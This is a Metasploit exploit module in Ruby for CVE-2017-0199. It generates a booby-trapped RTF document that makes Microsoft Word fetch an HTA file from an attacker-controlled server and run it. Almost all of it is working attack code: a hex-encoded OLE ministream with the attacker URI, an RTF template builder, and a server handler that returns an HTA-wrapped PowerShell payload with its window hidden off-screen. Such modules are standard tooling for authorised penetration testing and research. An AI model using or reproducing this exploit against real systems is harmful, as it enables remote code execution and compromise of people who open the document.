# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;


class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Remote::HttpServer::HTML

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => "Microsoft Office Word Malicious Hta Execution",
      &#039;Description&#039;    => %q{
        This module creates a malicious RTF file that when opened in
        vulnerable versions of Microsoft Word will lead to code execution.
        The flaw exists in how a olelink object can make a http(s) request,
        and execute hta code in response.

        This bug was originally seen being exploited in the wild starting
        in Oct 2016. This module was created by reversing a public
        malware sample.
      },
      &#039;Author&#039;         =>
        [
          &#039;Haifei Li&#039;, # vulnerability analysis
          &#039;ryHanson&#039;,
          &#039;wdormann&#039;,
          &#039;DidierStevens&#039;,
          &#039;vysec&#039;,
          &#039;Nixawk&#039;, # module developer
          &#039;sinn3r&#039;  # msf module improvement
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     => [
        [&#039;CVE&#039;, &#039;2017-0199&#039;],
        [&#039;URL&#039;, &#039;https://securingtomorrow.mcafee.com/mcafee-labs/critical-office-zero-day-attacks-detected-wild/&#039;],
        [&#039;URL&#039;, &#039;https://www.fireeye.com/blog/threat-research/2017/04/acknowledgement_ofa.html&#039;],
        [&#039;URL&#039;, &#039;https://www.helpnetsecurity.com/2017/04/10/ms-office-zero-day/&#039;],
        [&#039;URL&#039;, &#039;https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html&#039;],
        [&#039;URL&#039;, &#039;https://www.checkpoint.com/defense/advisories/public/2017/cpai-2017-0251.html&#039;],
        [&#039;URL&#039;, &#039;https://github.com/nccgroup/Cyber-Defence/blob/master/Technical%20Notes/Office%20zero-day%20(April%202017)/2017-04%20Office%20OLE2Link%20zero-day%20v0.4.pdf&#039;],
        [&#039;URL&#039;, &#039;https://blog.nviso.be/2017/04/12/analysis-of-a-cve-2017-0199-malicious-rtf-document/&#039;],
        [&#039;URL&#039;, &#039;https://www.hybrid-analysis.com/sample/ae48d23e39bf4619881b5c4dd2712b8fabd4f8bd6beb0ae167647995ba68100e?environmentId=100&#039;],
        [&#039;URL&#039;, &#039;https://www.mdsec.co.uk/2017/04/exploiting-cve-2017-0199-hta-handler-vulnerability/&#039;],
        [&#039;URL&#039;, &#039;https://www.microsoft.com/en-us/download/details.aspx?id=10725&#039;],
        [&#039;URL&#039;, &#039;https://msdn.microsoft.com/en-us/library/dd942294.aspx&#039;],
        [&#039;URL&#039;, &#039;https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-CFB/[MS-CFB].pdf&#039;],
        [&#039;URL&#039;, &#039;https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-0199&#039;]
      ],
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          [ &#039;Microsoft Office Word&#039;, {} ]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;DisablePayloadHandler&#039; => false
        },
      &#039;DefaultTarget&#039;  => 0,
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => &#039;Apr 14 2017&#039;))

    register_options([
      OptString.new(&#039;FILENAME&#039;, [ true, &#039;The file name.&#039;, &#039;msf.doc&#039;]),
      OptString.new(&#039;URIPATH&#039;,  [ true, &#039;The URI to use for the HTA file&#039;, &#039;default.hta&#039;])
    ], self.class)
  end

  def generate_uri
    uri_maxlength = 112

    host = datastore[&#039;SRVHOST&#039;] == &#039;0.0.0.0&#039; ? Rex::Socket.source_address : datastore[&#039;SRVHOST&#039;]
    scheme = datastore[&#039;SSL&#039;] ? &#039;https&#039; : &#039;http&#039;

    uri = "#{scheme}://#{host}:#{datastore[&#039;SRVPORT&#039;]}#{&#039;/&#039; + Rex::FileUtils.normalize_unix_path(datastore[&#039;URIPATH&#039;])}"
    uri = Rex::Text.hexify(Rex::Text.to_unicode(uri))
    uri.delete!("\n")
    uri.delete!("\\x")
    uri.delete!("\\")

    padding_length = uri_maxlength * 2 - uri.length
    fail_with(Failure::BadConfig, "please use a uri < #{uri_maxlength} bytes ") if padding_length.negative?
    padding_length.times { uri << "0" }
    uri
  end

  def create_ole_ministream_data
    # require &#039;rex/ole&#039;
    # ole = Rex::OLE::Storage.new(&#039;cve-2017-0199.bin&#039;, Rex::OLE::STGM_READ)
    # ministream = ole.instance_variable_get(:@ministream)
    # ministream_data = ministream.instance_variable_get(:@data)

    ministream_data = ""
    ministream_data << "01000002090000000100000000000000" # 00000000: ................
    ministream_data << "0000000000000000a4000000e0c9ea79" # 00000010: ...............y
    ministream_data << "f9bace118c8200aa004ba90b8c000000" # 00000020: .........K......
    ministream_data << generate_uri
    ministream_data << "00000000795881f43b1d7f48af2c825d" # 000000a0: ....yX..;..H.,.]
    ministream_data << "c485276300000000a5ab0000ffffffff" # 000000b0: ..&#039;c............
    ministream_data << "0609020000000000c000000000000046" # 000000c0: ...............F
    ministream_data << "00000000ffffffff0000000000000000" # 000000d0: ................
    ministream_data << "906660a637b5d2010000000000000000" # 000000e0: .f`.7...........
    ministream_data << "00000000000000000000000000000000" # 000000f0: ................
    ministream_data << "100203000d0000000000000000000000" # 00000100: ................
    ministream_data << "00000000000000000000000000000000" # 00000110: ................
    ministream_data << "00000000000000000000000000000000" # 00000120: ................
    ministream_data << "00000000000000000000000000000000" # 00000130: ................
    ministream_data << "00000000000000000000000000000000" # 00000140: ................
    ministream_data << "00000000000000000000000000000000" # 00000150: ................
    ministream_data << "00000000000000000000000000000000" # 00000160: ................
    ministream_data << "00000000000000000000000000000000" # 00000170: ................
    ministream_data << "00000000000000000000000000000000" # 00000180: ................
    ministream_data << "00000000000000000000000000000000" # 00000190: ................
    ministream_data << "00000000000000000000000000000000" # 000001a0: ................
    ministream_data << "00000000000000000000000000000000" # 000001b0: ................
    ministream_data << "00000000000000000000000000000000" # 000001c0: ................
    ministream_data << "00000000000000000000000000000000" # 000001d0: ................
    ministream_data << "00000000000000000000000000000000" # 000001e0: ................
    ministream_data << "00000000000000000000000000000000" # 000001f0: ................
    ministream_data
  end

  def create_rtf_format
    template_path = ::File.join(Msf::Config.data_directory, "exploits", "cve-2017-0199.rtf")
    template_rtf = ::File.open(template_path, &#039;rb&#039;)

    data = template_rtf.read(template_rtf.stat.size)
    data.gsub!(&#039;MINISTREAM_DATA&#039;, create_ole_ministream_data)
    template_rtf.close
    data
  end

  def on_request_uri(cli, req)
    p = regenerate_payload(cli)
    data = Msf::Util::EXE.to_executable_fmt(
      framework,
      ARCH_X86,
      &#039;win&#039;,
      p.encoded,
      &#039;hta-psh&#039;,
      { :arch => ARCH_X86, :platform => &#039;win&#039; }
    )

    # This allows the HTA window to be invisible
    data.sub!(/\n/, "\nwindow.moveTo -4000, -4000\n")

    send_response(cli, data, &#039;Content-Type&#039; => &#039;application/hta&#039;)
  end

  def exploit
    file_create(create_rtf_format)
    super
  end
end

